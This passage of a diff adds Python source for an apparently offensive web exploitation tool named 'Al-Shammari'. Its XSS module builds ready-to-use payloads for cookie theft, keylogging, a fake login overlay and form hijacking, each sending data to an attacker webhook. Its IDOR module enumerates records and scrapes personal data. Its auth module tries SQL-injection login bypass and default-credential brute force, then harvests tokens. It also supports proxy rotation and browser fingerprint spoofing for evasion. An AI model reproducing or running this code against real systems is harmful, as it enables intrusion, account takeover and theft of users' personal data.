+            for enc in [urllib.parse.quote(pl),urllib.parse.quote(pl,safe=""),
+                       pl.replace("<","%3C").replace(">","%3E"),
+                       pl.replace("<","\\u003c").replace(">","\\u003e"),
+                       pl.replace("script","scr<script>ipt").replace("</script>","</scr</script>ipt")]:
+                r=tpay(url,enc,method,param)
+                if r and marker in r["c"]:
+                    working_pl=enc; ok(f"  Working (encoded): {enc[:60]}")
+                    break
+            if working_pl: break
+    if not working_pl:
+        wrn("  No XSS execution confirmed")
+        return None
+
+    print(f"\n  {C.BO}{C.Y}[2/4] Generating Exploit Payloads{C.X}")
+    hook="https://WEBHOOK_URL"
+    exploits=[]
+    exploits.append(("Cookie Theft",
+        f"<script>new Image().src='{hook}/c?d='+document.cookie+'%26u='+document.location</script>",
+        "Steals all cookies + URL"))
+    exploits.append(("Session Hijack",
+        f"<script>fetch('{hook}/s?c='+btoa(document.cookie))</script>",
+        "Base64 encoded session exfiltration"))
+    exploits.append(("Keylogger",
+        f"<script>var k='';document.onkeypress=function(e){{k+=e.key;if(k.length>15){{new Image().src='{hook}/k?d='+btoa(k);k=''}}}}</script>",
+        "Captures all keystrokes"))
+    exploits.append(("Phishing Overlay",
+        f"<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center'><div style='background:white;padding:30px;border-radius:8px'><h3>Session Expired</h3><input id=u placeholder=Username style='display:block;margin:8px 0;padding:8px;width:250px'><input id=p type=password placeholder=Password style='display:block;margin:8px 0;padding:8px;width:250px'><button onclick=\"new Image().src='{hook}/ph?d='+document.getElementById('u').value+':'+document.getElementById('p').value\" style='padding:8px 20px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer'>Login</button></div></div>",
+        "Fake login overlay"))
+    exploits.append(("Page Source Dump",
+        f"<script>new Image().src='{hook}/src?d='+btoa(document.documentElement.innerHTML)</script>",
+        "Dumps entire page HTML"))
+    exploits.append(("Admin Probe",
+        f"<script>var x=new XMLHttpRequest();x.open('GET','/admin');x.onload=function(){{new Image().src='{hook}/a?d='+btoa(x.responseText)}};x.send()</script>",
+        "Fetches admin page content"))
+    exploits.append(("Internal Network Scan",
+        f"<script>['/api/users','/api/admin','/api/config','/api/keys','/api/internal'].forEach(function(p){{var x=new XMLHttpRequest();x.open('GET',p);x.onload=function(){{new Image().src='{hook}/net?p='+p+'&d='+btoa(x.responseText.substring(0,500))}};x.send()}})</script>",
+        "Probes internal API endpoints"))
+    exploits.append(("Form Hijack",
+        f"<script>document.forms.forEach(function(f){{f.addEventListener('submit',function(e){{e.preventDefault();new Image().src='{hook}/form?d='+btoa(JSON.stringify(Object.fromEntries(new FormData(f))))}})}})</script>",
+        "Intercepts all form submissions"))
+
+    print(f"\n  {C.BO}{C.G}Ready-to-use Exploit URLs:{C.X}\n")
+    for name,payload,impact in exploits:
+        print(f"  {C.R}[{name}]{C.X}")
+        print(f"  {C.D}Impact: {impact}{C.X}")
+        enc_pl=urllib.parse.quote(payload)
+        if param:
+            if method=="POST":
+                print(f"  curl -X POST '{url}' -d '{param}={enc_pl[:200]}'")
+            else:
+                sep="&" if "?" in url else "?"
+                print(f"  {url}{sep}{param}={enc_pl[:200]}")
+        print(f"  {C.D}{'─'*60}{C.X}")
+
+    print(f"\n  {C.BO}{C.Y}[3/4] CORS & PostMessage Probe{C.X}")
+    r=req(url,method=method,hdrs={"Origin":"https://evil.com"},stealth=False)
+    if r:
+        acao=r["h"].get("Access-Control-Allow-Origin","")
+        acac=r["h"].get("Access-Control-Allow-Credentials","")
+        if "*" in acao or "evil.com" in acao:
+            ok(f"  {C.R}CORS misconfiguration: ACAO={acao} ACAC={acac}{C.X}")
+            exploits.append(("CORS Theft",
+                f"<script>fetch('{url}',{{credentials:'include'}}).then(r=>r.text()).then(t=>new Image().src='{hook}/cors?d='+btoa(t)))</script>",
+                "CORS allows evil.com origin"))
+        if "postMessage" in r["c"]:
+            wrn("  postMessage detected in page - potential DOM sink")
+            exploits.append(("PostMessage Abuse",
+                f"<script>window.addEventListener('message',function(e){{new Image().src='{hook}/pm?d='+btoa(e.data)}})</script>",
+                "Listens for leaked postMessages"))
+
+    print(f"\n  {C.BO}{C.Y}[4/4] Summary{C.X}")
+    ok(f"  Working payload: {working_pl[:60]}")
+    ok(f"  Injection context: {working_ctx.get('desc','unknown')}")
+    ok(f"  Exploit variants: {len(exploits)}")
+
+    print(f"\n{C.BO}{C.G}  [!] XSS Exploit Done{C.X}\n")
+    return{"working_payload":working_pl,"context":working_ctx,"exploits":exploits}
+
+def exp_idor(url,method="GET"):
+    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
+    print(f"{C.BO}{C.R}  IDOR Exploitation Module{C.X}")
+    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")
+
+    ps=urlparse(url)
+    pq=parse_qs(ps.query)
+
+    ip=[k for k in pq if any(x in k.lower() for x in IDOR_NAMES)]
+    if not ip: ip=list(pq.keys())
+
+    for ip2 in ip:
+        print(f"{C.BO}  Exploiting parameter: {ip2}{C.X}\n")
+
+        br=req(url,stealth=False)
+        if br.get("e"): err("Cannot reach target"); continue
+        base_hash=content_hash(br["c"])
+        base_len=br["l"]
+
+        print(f"  {C.BO}{C.Y}[Phase 1] Sequential ID Scan (1-50){C.X}")
+        print(f"  {C.D}{'─'*50}{C.X}")
+        found=[]
+        for vid in range(1,51):
+            tp=dict(pq); tp[ip2]=[str(vid)]
+            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
+            rr=req(tu)
+            if rr.get("e"): continue
+            if rr["s"]==200 and rr["l"]>100:
+                h=content_hash(rr["c"])
+                if h!=base_hash or rr["l"]!=base_len:
+                    emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
+                    phones=re.findall(r'[\+]?[0-9]{1,3}[-.\s]?[0-9]{3}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{4}',rr["c"])
+                    names=re.findall(r'<(?:strong|b|h[1-6]|span|td|div)[^>]*>\s*([A-Z][a-z]+(?:\s+[A-Z][a-z]+)*)\s*</',rr["c"])
+                    amounts=re.findall(r'[\$€£]\s*[\d,]+\.?\d*',rr["c"])
+                    data={"id":vid,"url":tu,"len":rr["l"],"hash":h[:8],
+                          "emails":emails[:3],"phones":phones[:2],
+                          "names":names[:3],"amounts":amounts[:3]}
+                    found.append(data)
+                    preview=""
+                    if data["emails"]: preview+=f" email={','.join(data['emails'])}"
+                    if data["names"]: preview+=f" name={','.join(data['names'])}"
+                    if data["amounts"]: preview+=f" amount={','.join(data['amounts'])}"
+                    if data["phones"]: preview+=f" phone={','.join(data['phones'])}"
+                    print(f"    {C.G}[{vid}]{C.X} {rr['l']}b{C.D}{preview}{C.X}")
+            print(f"\r    Scanning... {vid}/50",end="",flush=True)
+        print(f"\r    {' '*40}")
+
+        print(f"\n  {C.BO}{C.Y}[Phase 2] Extended Range (100-200, 500, 1000){C.X}")
+        print(f"  {C.D}{'─'*50}{C.X}")
+        for vid in list(range(100,201,10))+[500,1000]:
+            tp=dict(pq); tp[ip2]=[str(vid)]
+            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
+            rr=req(tu)
+            if rr.get("e"): continue
+            if rr["s"]==200 and rr["l"]>100:
+                h=content_hash(rr["c"])
+                if h!=base_hash:
+                    emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
+                    if emails:
+                        print(f"    {C.R}[{vid}]{C.X} email={','.join(emails[:3])}")
+                        found.append({"id":vid,"url":tu,"emails":emails[:3]})
+
+        if found:
+            print(f"\n  {C.BO}{C.G}[!] Data Extraction Summary{C.X}")
+            print(f"  {C.D}{'─'*50}{C.X}")
+            all_emails=set()
+            all_names=set()
+            all_amounts=set()
+            for f in found:
+                all_emails.update(f.get("emails",[]))
+                all_names.update(f.get("names",[]))
+                all_amounts.update(f.get("amounts",[]))
+            if all_emails:
+                print(f"  {C.R}Emails found ({len(all_emails)}):{C.X}")
+                for e in sorted(all_emails)[:20]:
+                    print(f"    {C.G}*{C.X} {e}")
+            if all_names:
+                print(f"  {C.R}Names found ({len(all_names)}):{C.X}")
+                for n in sorted(all_names)[:20]:
+                    print(f"    {C.G}*{C.X} {n}")
+            if all_amounts:
+                print(f"  {C.R}Amounts found ({len(all_amounts)}):{C.X}")
+                for a in sorted(all_amounts)[:20]:
+                    print(f"    {C.G}*{C.X} {a}")
+            print(f"\n  Total accessible records: {C.BO}{len(found)}{C.X}")
+            ok(f"  IDs accessible: {', '.join(str(f['id']) for f in found[:30])}")
+        else:
+            wrn("  No data extracted from sequential scan")
+
+    print(f"\n{C.BO}{C.G}  [!] IDOR Exploitation Complete{C.X}\n")
+    return found
+
+def exp_auth(url):
+    print(f"\n{C.BO}{C.R}{'═'*70}{C.X}")
+    print(f"{C.BO}{C.R}  Auth Bypass Exploitation Module{C.X}")
+    print(f"{C.BO}{C.R}{'═'*70}{C.X}\n")
+
+    ps=urlparse(url)
+    base=f"{ps.scheme}://{ps.netloc}"
+
+    print(f"{C.BO}{C.Y}  [Phase 1] Login Brute Force with SQLi{C.X}")
+    print(f"  {C.D}{'─'*50}{C.X}")
+
+    lf=[{"username":"user","password":"pass"},
+        {"user":"user","pass":"pass"},
+        {"login":"user","password":"pass"},
+        {"email":"user","password":"pass"},
+        {"username":"admin","password":"admin"},
+        {"email":"admin@site.com","password":"admin"}]
+
+    sessions=[]
+    for pl in SQLI["auth"][:10]:
+        for fd in lf:
+            dt={k:pl if k in ["username","user","login","email"] else v for k,v in fd.items()}
+            pre_ck=dict(st.all_cookies())
+            rr=req(url,method="POST",data=dt)
+            if rr.get("e"): continue
+            if rr["s"] in [200,302,301]:
+                proofs=auth_verify(url,dt,rr,pre_ck)
+                if len(proofs)>=2:
+                    post_ck=st.all_cookies()
+                    new_ck={k:v for k,v in post_ck.items() if k not in pre_ck}
+                    sess={"payload":pl,"status":rr["s"],"cookies":new_ck,
+                          "proofs":proofs,"response_len":rr["l"]}
+                    sessions.append(sess)
+                    ok(f"  Auth bypass: {pl[:40]} | Status: {rr['s']}")
+                    for p in proofs:
+                        inf(f"    [{p['method']}] {p['evidence']}")
+                    break
+        if sessions: break
+
+    if not sessions:
+        wrn("  No auth bypass found with standard payloads")
+        print(f"\n  {C.BO}{C.Y}Trying common credentials...{C.X}")
+        creds=[("admin","admin"),("admin","password"),("admin","admin123"),
+               ("admin","root"),("root","root"),("admin","123456"),
+               ("admin","admin@123"),("administrator","administrator"),
+               ("admin","P@ssw0rd"),("admin","toor"),("test","test"),
+               ("user","user"),("demo","demo"),("guest","guest")]
+        for u,p in creds:
+            for fd in lf:
+                dt={k:(u if k in ["username","user","login","email"] else p) for k,v in fd.items()}
+                pre_ck=dict(st.all_cookies())
+                rr=req(url,method="POST",data=dt)
+                if rr.get("e"): continue
+                if rr["s"] in [200,302,301]:
+                    proofs=auth_verify(url,dt,rr,pre_ck)
+                    if len(proofs)>=1:
+                        post_ck=st.all_cookies()
+                        new_ck={k:v for k,v in post_ck.items() if k not in pre_ck}
+                        sessions.append({"payload":f"{u}:{p}","status":rr["s"],
+                                        "cookies":new_ck,"proofs":proofs,"response_len":rr["l"]})
+                        ok(f"  Credential: {u}:{p} | Status: {rr['s']}")
+                        break
+            if sessions: break
+
+    if sessions:
+        sess=sessions[0]
+        print(f"\n{C.BO}{C.Y}  [Phase 2] Post-Auth Access{C.X}")
+        print(f"  {C.D}{'─'*50}{C.X}")
+
+        endpoints=["/admin","/dashboard","/profile","/api/user","/api/users",
+                   "/api/me","/api/admin","/panel","/manage","/settings",
+                   "/admin/users","/admin/dashboard","/user/profile",
+                   "/account","/home","/api/v1/user","/api/v1/admin",
+                   "/console","/control","/backend","/administrator"]
+
+        accessible=[]
+        for ep in endpoints:
+            rr=req(base+ep)
+            if rr.get("e"): continue
+            if rr["s"]==200 and len(rr["c"])>200 and not is_error_page(rr["c"],rr["s"]):
+                data_type="unknown"
+                if rr["c"].strip().startswith("{") or rr["c"].strip().startswith("["):
+                    data_type="JSON"
+                elif "<html" in rr["c"].lower():
+                    data_type="HTML"
+                accessible.append({"endpoint":ep,"status":rr["s"],
+                                   "length":rr["l"],"type":data_type})
+                ok(f"  {ep} -> {rr['s']} ({rr['l']}b, {data_type})")
+
+        if accessible:
+            print(f"\n{C.BO}{C.Y}  [Phase 3] Data Harvest{C.X}")
+            print(f"  {C.D}{'─'*50}{C.X}")
+            for acc in accessible:
+                rr=req(base+acc["endpoint"])
+                if rr.get("e"): continue
+                emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',rr["c"])
+                tokens=re.findall(r'["\']?(?:token|api_?key|secret|session)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9._-]{10,})',rr["c"],re.IGNORECASE)
+                users=re.findall(r'"(?:username|user|email|name)"\s*:\s*"([^"]+)"',rr["c"],re.IGNORECASE)
+                if emails:
+                    ok(f"  Emails from {acc['endpoint']}:")
+                    for e in emails[:10]: print(f"    {C.G}*{C.X} {e}")
+                if tokens:
+                    ok(f"  Tokens/Keys from {acc['endpoint']}:")
+                    for t in tokens[:5]: print(f"    {C.R}*{C.X} {t[:50]}")
+                if users:
+                    ok(f"  Usernames from {acc['endpoint']}:")
+                    for u in users[:10]: print(f"    {C.G}*{C.X} {u}")
+
+        print(f"\n  {C.BO}Session Info:{C.X}")
+        for k,v in sess.get("cookies",{}).items():
+            print(f"    Cookie: {C.G}{k}={v[:40]}{C.X}")
+    else:
+        wrn("  No authentication bypass achieved")
+
+    print(f"\n{C.BO}{C.G}  [!] Auth Exploitation Complete{C.X}\n")
+    return sessions
+
+def menu():
+    menu_title = f"{C.CY}Al-Shammari - Main Menu{C.X}"
+    menu_lines = [
+        f"{C.G}1.{C.X}  Full Scan + Exploit (All Payloads)",
+        f"{C.G}2.{C.X}  SQLi Scan + Exploit",
+        f"{C.G}3.{C.X}  XSS Scan + Exploit",
+        f"{C.G}4.{C.X}  IDOR Scan + Exploit",
+        f"{C.G}5.{C.X}  Auth Bypass Scan + Exploit",
+        f"{C.G}6.{C.X}  Extra Payloads Scan (NoSQL + SSTI + CMDI + XXE)",
+        f"{C.G}7.{C.X}  Custom Payload Test",
+        f"{C.G}8.{C.X}  Database-Specific SQLi + Exploit",
+        f"{C.G}9.{C.X}  Fingerprint Target",
+        f"{C.G}10.{C.X} Batch Scan + Exploit (from file)",
+        f"{C.G}0.{C.X}  Exit",
+    ]
+    while True:
+        banner()
+        print("\n" + box(menu_lines, menu_title) + "\n")
+        try:
+            ch=input(f"{C.BO}{C.CY}[?] Select option: {C.X}").strip()
+        except KeyboardInterrupt:
+            print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+            break
+        if ch=="1":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            if not u: err("URL required"); continue
+            rs,_=auto(u); pres(rs)
+        elif ch=="2":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            pres(s_sqli(u,param=p))
+        elif ch=="3":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            pres(s_xss(u,param=p))
+        elif ch=="4":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            pres(s_idor(u))
+        elif ch=="5":
+            try:
+                u=input(f"{C.CY}[?] Login URL: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            pres(s_auth(u))
+        elif ch=="6":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            pres(s_extra(u,param=p))
+        elif ch=="7":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+                pl=input(f"{C.CY}[?] Payload: {C.X}").strip()
+                mt=input(f"{C.CY}[?] Method [GET]: {C.X}").strip().upper() or "GET"
+                pm=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            rr=tpay(u,pl,mt,pm)
+            if rr:
+                inf(f"Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
+                for e in det_err(rr["c"]): inf(f"  SQLi: {e['d']}")
+                for x in det_xss(rr["c"],pl): inf(f"  XSS: {x['x']}")
+        elif ch=="8":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+                print("\n  1. MSSQL  2. PostgreSQL  3. Oracle")
+                db=input(f"{C.CY}[?] Database: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            dm={"1":"mssql","2":"postgresql","3":"oracle"}
+            try:
+                pm=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            rs=[]; pls=SQLI.get(dm.get(db,"mssql"),[])
+            inf(f"Testing {dm.get(db,'mssql').upper()}...")
+            for p in pls:
+                rr=tpay(u,p,param=pm)
+                if rr and det_err(rr["c"]):
+                    vln(f"  {p[:50]}")
+                    rs.append({"type":f"SQLi ({dm.get(db)})","severity":"high","param":pm or "N/A","payload":p,"status":rr["s"]})
+            if rs:
+                inf(f"  {C.R}Exploiting database-specific SQLi...{C.X}")
+                exp_data=exp_sqli(u,"GET",pm,rs)
+                for r in rs: r["exploit"]=exp_data
+            pres(rs)
+        elif ch=="9":
+            try:
+                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            fp(u)
+        elif ch=="10":
+            try:
+                fp2=input(f"{C.CY}[?] File path: {C.X}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+                break
+            if not os.path.exists(fp2): err("File not found"); continue
+            with open(fp2) as f: us=[l.strip() for l in f if l.strip()]
+            inf(f"Loaded {len(us)} URLs"); ar=[]
+            for u in us:
+                r,_=auto(u); ar.extend(r)
+            pres(ar)
+        elif ch=="0":
+            inf("Goodbye!"); break
+        else:
+            err("Invalid option")
+        try:
+            input(f"\n{C.CY}Press Enter to continue...{C.X}")
+        except KeyboardInterrupt:
+            print(f"\n{C.Y}[!]{C.X} Interrupted by user")
+            break
+
+if __name__=="__main__":
+    pa=argparse.ArgumentParser(description="Al-Shammari - Multi-Vulnerability Scanner")
+    pa.add_argument("-u","--url"); pa.add_argument("-p","--payload")
+    pa.add_argument("-m","--method",default="GET"); pa.add_argument("-P","--param")
+    pa.add_argument("-t","--type",choices=["auto","sqli","xss","idor","auth","extra","fp"])
+    pa.add_argument("-f","--file"); pa.add_argument("--menu",action="store_true")
+    pa.add_argument("--proxy"); pa.add_argument("--proxy-file")
+    pa.add_argument("--delay"); pa.add_argument("--no-delay",action="store_true")
+    pa.add_argument("--cookies"); pa.add_argument("--fingerprint",choices=["chrome_win","chrome_mac","chrome_linux","firefox_win","firefox_mac","firefox_linux","safari_mac","edge_win"])
+    ar=pa.parse_args()
+    if ar.proxy: st.proxy=ar.proxy
+    if ar.proxy_file:
+        try:
+            with open(ar.proxy_file) as f: st.proxies=[l.strip() for l in f if l.strip()]
+            inf(f"Loaded {len(st.proxies)} proxies")
+        except: err("Cannot load proxy file")
+    if ar.fingerprint: st.fingerprint=ar.fingerprint
+    if ar.delay:
+        pt=ar.delay.split("-"); st.mind,st.maxd=float(pt[0]),float(pt[1])
+        st._adaptive_delay_min,st._adaptive_delay_max=st.mind,st.maxd
+    if ar.no_delay:
+        st.no_delay=True
+        st.mind=st.maxd=0
+        st._adaptive_delay_min=st._adaptive_delay_max=0
+    if ar.cookies:
+        for p in ar.cookies.split(";"):
+            if "=" in p: k,v=p.split("=",1); st.cookies[k.strip()]=v.strip()
+    if ar.menu or (not ar.url and not ar.file): menu()
+    elif ar.file:
+        with open(ar.file) as f: us=[l.strip() for l in f if l.strip()]
+        ar2=[]
+        for u in us: r,_=auto(u); ar2.extend(r)
+        pres(ar2)
+    elif ar.url:
+        if ar.payload:
+            rr=tpay(ar.url,ar.payload,ar.method,ar.param)
+            if rr:
+                inf(f"Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
+                for e in det_err(rr["c"]): inf(f"  SQLi: {e['d']}")
+                for x in det_xss(rr["c"],ar.payload): inf(f"  XSS: {x['x']}")
+        elif ar.type=="auto":
+            r,_=auto(ar.url); pres(r)
+        elif ar.type=="sqli": pres(s_sqli(ar.url,ar.method,ar.param))
+        elif ar.type=="xss": pres(s_xss(ar.url,ar.method,ar.param))
+        elif ar.type=="idor": pres(s_idor(ar.url,ar.method))
+        elif ar.type=="auth": pres(s_auth(ar.url))
+        elif ar.type=="extra": pres(s_extra(ar.url,ar.method,ar.param))
+        elif ar.type=="fp": fp(ar.url)
